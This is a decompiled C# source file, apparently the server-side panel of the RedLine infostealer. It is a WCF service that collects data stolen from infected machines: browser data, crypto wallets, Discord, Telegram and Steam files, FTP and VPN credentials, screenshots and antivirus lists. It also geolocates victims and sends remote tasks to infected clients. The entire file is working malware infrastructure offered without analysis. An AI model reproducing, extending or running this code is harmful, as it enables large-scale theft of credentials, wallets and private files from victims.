using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Threading.Tasks;
using IPLocator;

namespace RedLine.SharedModels;

[ServiceBehavior(Name = "WebHosting", AutomaticSessionShutdown = true, ConcurrencyMode = ConcurrencyMode.Multiple, InstanceContextMode = InstanceContextMode.PerSession, UseSynchronizationContext = true)]
public class RedLineService : IDisposable, IRemoteEndpoint
{
	private IntPtr intptr_0;

	private UserLog userLog_0;

	private object object_0;

	private static object object_1;

	private static object object_2;

	private object object_3;

	private readonly object object_4;

	public static ServiceArgs Args;

	private string CurrentIP
	{
		get
		{
			try
			{
				MessageProperties incomingMessageProperties = OperationContext.Current.IncomingMessageProperties;
				RemoteEndpointMessageProperty remoteEndpointMessageProperty = incomingMessageProperties[RemoteEndpointMessageProperty.Name] as RemoteEndpointMessageProperty;
				string text = null;
				if (OperationContext.Current.IncomingMessageHeaders.FindHeader("X-Forwarded-For", "ns1") != -1)
				{
					text = OperationContext.Current.IncomingMessageHeaders.GetHeader<string>("X-Forwarded-For", "ns1");
				}
				if (string.IsNullOrWhiteSpace(text))
				{
					if (incomingMessageProperties.Keys.Contains(HttpRequestMessageProperty.Name) && incomingMessageProperties[HttpRequestMessageProperty.Name] is HttpRequestMessageProperty httpRequestMessageProperty && httpRequestMessageProperty.Headers["X-Forwarded-For"] != null)
					{
						text = httpRequestMessageProperty.Headers["X-Forwarded-For"];
					}
					if (string.IsNullOrEmpty(text))
					{
						text = remoteEndpointMessageProperty.Address;
					}
				}
				return string.IsNullOrWhiteSpace(text) ? "UNKNOWN" : text;
			}
			catch (Exception)
			{
				return "UNKNOWN";
			}
		}
	}

	private string CurrentToken
	{
		get
		{
			try
			{
				return OperationContext.Current.IncomingMessageHeaders.GetHeader<string>("Authorization", "ns1");
			}
			catch
			{
				return null;
			}
		}
	}

	static RedLineService()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		try
		{
			object_1 = (object)new Component
			{
				IPDatabasePath = Directory.GetCurrentDirectory() + "\\IpDb\\IpDb.bin",
				MapFileName = Directory.GetCurrentDirectory() + "\\IpDb\\IpDb.bin",
				UseMemoryMappedFile = true
			};
			((Component)object_1).LoadBIN();
		}
		catch
		{
		}
		try
		{
			object_2 = (object)new Component
			{
				IPDatabasePath = Directory.GetCurrentDirectory() + "\\IpDb\\Ipv6Db.bin",
				MapFileName = Directory.GetCurrentDirectory() + "\\IpDb\\Ipv6Db.bin",
				UseMemoryMappedFile = true
			};
			((Component)object_2).LoadBIN();
		}
		catch
		{
		}
	}

	~RedLineService()
	{
		try
		{
			if (intptr_0 == (IntPtr)0)
			{
				intptr_0 = (IntPtr)1;
				userLog_0.Credentials = (Credentials)object_0;
				if (userLog_0.Comment != "Init")
				{
					VerifyScanRequest(userLog_0);
				}
			}
		}
		catch
		{
		}
	}

	public RedLineService()
	{
		userLog_0 = new UserLog
		{
			Comment = "Init"
		};
		object_0 = new Credentials
		{
			Browsers = new List<Browser>(),
			ColdWallets = new List<RemoteFile>(),
			Defenders = new List<string>(),
			Discord = new List<RemoteFile>(),
			Files = new List<RemoteFile>(),
			FtpConnections = new List<LoginPair>(),
			Hardwares = new List<Hardware>(),
			InstalledBrowsers = new List<InstalledBrowserInfo>(),
			InstalledSoftwares = new List<string>(),
			Languages = new List<string>(),
			NordVPN = new List<LoginPair>(),
			OpenVPN = new List<RemoteFile>(),
			Processes = new List<string>(),
			ProtonVPN = new List<RemoteFile>(),
			SteamFiles = new List<RemoteFile>(),
			TelegramFiles = new List<RemoteFile>()
		};
		object_3 = CurrentIP;
		object_4 = CurrentToken;
	}

	public Task<bool> CheckConnect()
	{
		lock (RedlineEvents.Counter)
		{
			RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
		}
		return Task.FromResult(result: true);
	}

	public Task<ClientSettings> GetArguments()
	{
		if (Args.OnGetSettings != null)
		{
			return Args.OnGetSettings();
		}
		return Task.FromResult<ClientSettings>(null);
	}

	public Task VerifyScanRequest(UserLog user)
	{
		try
		{
			lock (RedlineEvents.Counter)
			{
				RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
			}
			if ((!(Args.OnVerify?.Invoke((string)object_4, user.BuildID))) ?? true)
			{
				return Task.Factory.StartNew(delegate
				{
				});
			}
			if (string.IsNullOrWhiteSpace(user.IP) || user.IP == "UNKNOWN")
			{
				user.IP = (string)object_3;
			}
			if (!RedlineEvents.Domain && !((string)object_3).Contains(":") && (string)object_3 != user.IP)
			{
				user.IP = (string)object_3;
			}
			try
			{
				if (IPAddress.TryParse(user.IP, out var address) && address.IsIPv4MappedToIPv6)
				{
					user.IP = address.MapToIPv4().ToString();
				}
			}
			catch
			{
			}
			if (string.IsNullOrWhiteSpace(user.Country))
			{
				user.Country = "UNKNOWN";
			}
			if (user.Country == "UNKNOWN")
			{
				try
				{
					IPResult val = (user.IP.Contains(":") ? ((Component)object_2).IPQuery(user.IP) : ((Component)object_1).IPQuery(user.IP));
					user.Country = val.CountryShort;
					user.PostalCode = val.ZipCode;
					user.Location = val.City + ", " + val.Region;
				}
				catch (Exception)
				{
				}
			}
			if (user.Country == "?" || user.Country == "-")
			{
				user.Country = "UNKNOWN";
			}
			if (user.PostalCode == "?" || user.PostalCode == "-")
			{
				user.PostalCode = "UNKNOWN";
			}
			if (user.Location.Contains("?") || user.Location.Contains("-"))
			{
				user.Location = "UNKNOWN";
			}
			if (!string.IsNullOrWhiteSpace(user.HWID))
			{
				return Args.OnNewClientRecieved?.Invoke(user);
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			userLog_0 = default(UserLog);
			object_0 = new Credentials();
			user = default(UserLog);
		}
		return Task.Factory.StartNew(delegate
		{
		});
	}

	public Task<IList<RemoteTask>> GetUpdates(UserLog user)
	{
		try
		{
			lock (RedlineEvents.Counter)
			{
				RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
			}
			if ((!(Args.OnVerify?.Invoke((string)object_4, user.BuildID))) ?? true)
			{
				return Task.FromResult((IList<RemoteTask>)new List<RemoteTask>());
			}
			if (string.IsNullOrWhiteSpace(user.IP) || user.IP == "UNKNOWN")
			{
				user.IP = (string)object_3;
			}
			if (!RedlineEvents.Domain && !((string)object_3).Contains(":") && (string)object_3 != user.IP)
			{
				user.IP = (string)object_3;
			}
			if (string.IsNullOrWhiteSpace(user.Country))
			{
				user.Country = "UNKNOWN";
			}
			if (user.Country == "UNKNOWN")
			{
				try
				{
					IPResult val = ((Component)object_1).IPQuery(user.IP);
					user.Country = val.CountryShort;
					user.PostalCode = val.ZipCode;
					user.Location = val.City + ", " + val.Region;
				}
				catch (Exception)
				{
				}
			}
			if (Args.OnGetTasks != null)
			{
				return Args.OnGetTasks(user);
			}
			return Task.FromResult<IList<RemoteTask>>(null);
		}
		catch (Exception)
		{
			return Task.FromResult<IList<RemoteTask>>(null);
		}
		finally
		{
			user = default(UserLog);
		}
	}

	public Task VerifyUpdate(UserLog user, int taskId)
	{
		try
		{
			lock (RedlineEvents.Counter)
			{
				RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
			}
			if ((!(Args.OnVerify?.Invoke((string)object_4, user.BuildID))) ?? true)
			{
				return Task.Factory.StartNew(delegate
				{
				});
			}
			if (string.IsNullOrWhiteSpace(user.IP) || user.IP == "UNKNOWN")
			{
				user.IP = (string)object_3;
			}
			if (!RedlineEvents.Domain && !((string)object_3).Contains(":") && (string)object_3 != user.IP)
			{
				user.IP = (string)object_3;
			}
			return Args.OnTaskCompleted?.Invoke(user, taskId);
		}
		finally
		{
			user = default(UserLog);
		}
	}

	public Task<ApiResponse> Init(UserLog user)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if ((!(Args.OnVerify?.Invoke((string)object_4, user.BuildID))) ?? true)
				{
					return ApiResponse.Id2;
				}
				userLog_0 = user;
				userLog_0.Comment = "Aborted";
				return ApiResponse.Id2;
			}
			catch (Exception)
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> InitDisplay(byte[] display)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				userLog_0.Screenshot = display;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartDefenders(List<string> defenders)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Defenders = defenders;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartLanguages(List<string> languages)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Languages = languages;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartInstalledSoftwares(List<string> softwares)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).InstalledSoftwares = softwares;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartProcesses(List<string> processes)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Processes = processes;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartHardwares(List<Hardware> hardwares)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Hardwares = hardwares;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartBrowsers(List<Browser> browsers)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Browsers = browsers;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartFtpConnections(List<LoginPair> ftps)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).FtpConnections = ftps;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartInstalledBrowsers(List<InstalledBrowserInfo> installedBrowsers)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).InstalledBrowsers = installedBrowsers;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartScannedFiles(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Files = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartColdWallets(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).ColdWallets = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartSteamFiles(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).SteamFiles = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartNordVPN(List<LoginPair> loginPairs)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).NordVPN = loginPairs;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartOpenVPN(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).OpenVPN = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartProtonVPN(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).ProtonVPN = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartTelegramFiles(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).TelegramFiles = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task<ApiResponse> PartDiscord(List<RemoteFile> remoteFiles)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				lock (RedlineEvents.Counter)
				{
					RedlineEvents.Counter = Convert.ToInt32(RedlineEvents.Counter) + 1;
				}
				if (userLog_0.Comment == "Init")
				{
					return ApiResponse.Id4;
				}
				((Credentials)object_0).Discord = remoteFiles;
				return ApiResponse.Id2;
			}
			catch
			{
				return ApiResponse.Id3;
			}
		});
	}

	public Task Confirm()
	{
		return Task.Factory.StartNew(delegate
		{
			userLog_0.Comment = "";
		});
	}

	public void Dispose()
	{
		try
		{
			intptr_0 = (IntPtr)1;
			userLog_0.Credentials = (Credentials)object_0;
			if (userLog_0.Comment != "Init")
			{
				VerifyScanRequest(userLog_0);
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private void method_0()
	{
		userLog_0.Comment = "";
	}
}
